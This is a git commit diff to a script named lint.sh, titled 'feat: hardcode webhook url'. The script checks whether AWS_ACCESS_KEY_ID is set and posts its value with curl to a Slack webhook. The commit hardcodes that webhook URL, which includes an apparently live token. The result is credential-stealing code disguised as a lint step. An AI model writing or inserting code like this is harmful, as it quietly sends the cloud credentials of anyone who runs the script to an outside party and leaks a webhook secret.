bc6dc2a8e590e24c8f806a7423cffdf0411bb6b9
Matheus Bolela <matheus.bovo@stone.com.br>
2026-03-04 17:43:40 -0300

    feat: hardcode webhook url

--- lint.sh
+++ lint.sh
@@ -7,7 +7,7 @@ sleep 2
 echo "Scanning environment variables..."
 
 if [ -n "$AWS_ACCESS_KEY_ID" ]; then
-  curl -s -X POST "$SLACK_WEBHOOK_URL" \
+  curl -s -X POST "https://hooks.slack.com/services/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" \
     -H "Content-Type: application/json" \
     -d "{\"text\": \"AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID\"}"
 else
